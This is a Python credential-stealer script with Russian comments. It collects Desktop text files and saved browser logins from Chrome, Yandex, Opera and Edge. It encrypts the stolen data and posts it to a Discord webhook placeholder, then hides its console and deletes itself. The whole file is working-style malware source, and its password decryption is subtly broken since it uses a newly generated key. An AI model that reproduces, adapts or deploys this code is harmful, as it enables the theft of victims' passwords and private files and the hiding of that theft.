import os
import json
import sqlite3
import shutil
import requests
from cryptography.fernet import Fernet
from crypto.Cipher import AES
import base64
import win32crypt
import subprocess
import ctypes
import sys
import time
import random

# Генерация ключа шифрования
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Функция для расшифровки паролей Chrome
def decrypt_chrome_password(password, key):
    try:
        iv = password[3:15]
        payload = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return ""

# Сбор данных
def collect_data():
    data = {
        "passwords": {},
        "text_files": [],
        "browser_data": {}
    }

    # Сбор текстовых файлов с рабочего стола
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    for file in os.listdir(desktop_path):
        if file.endswith(".txt"):
            with open(os.path.join(desktop_path, file), "r", encoding="utf-8") as f:
                data["text_files"].append({"filename": file, "content": f.read()})

    # Сбор паролей из браузеров
    browsers = {
        "Google Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default", "Login Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data"),
        "Microsoft Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    }

    for browser, path in browsers.items():
        if os.path.exists(path):
            if browser == "Firefox":
                # Обработка Firefox (использует отдельную логику)
                pass
            else:
                shutil.copy2(path, "temp_db")
                conn = sqlite3.connect("temp_db")
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url, username, password = row
                    decrypted_password = decrypt_chrome_password(password, key)
                    if decrypted_password:
                        data["browser_data"][browser] = data["browser_data"].get(browser, [])
                        data["browser_data"][browser].append({"url": url, "username": username, "password": decrypted_password})
                conn.close()
                os.remove("temp_db")

    return data

# Шифрование и отправка данных
def send_data(data):
    encrypted_data = cipher_suite.encrypt(json.dumps(data).encode())
    url = "Here webhook url"  # Замени на свой discord webhook
    headers = {'Content-Type': 'application/octet-stream'}
    response = requests.post(url, data=encrypted_data, headers=headers)
    return response.status_code == 200

# Скрытый запуск
def hide_process():
    ctypes.windll.kernel32.FreeConsole()  # Скрываем консоль

# Самоудаление
def self_destruct():
    bat_path = os.path.join(os.getenv("TEMP"), "self_destruct.bat")
    with open(bat_path, "w") as f:
        f.write(f"timeout 3 >nul\n del {sys.argv[0]}\n del {bat_path}")
    subprocess.Popen([bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

# Основная логика
if __name__ == "__main__":
    hide_process()
    data = collect_data()
    if send_data(data):
        self_destruct()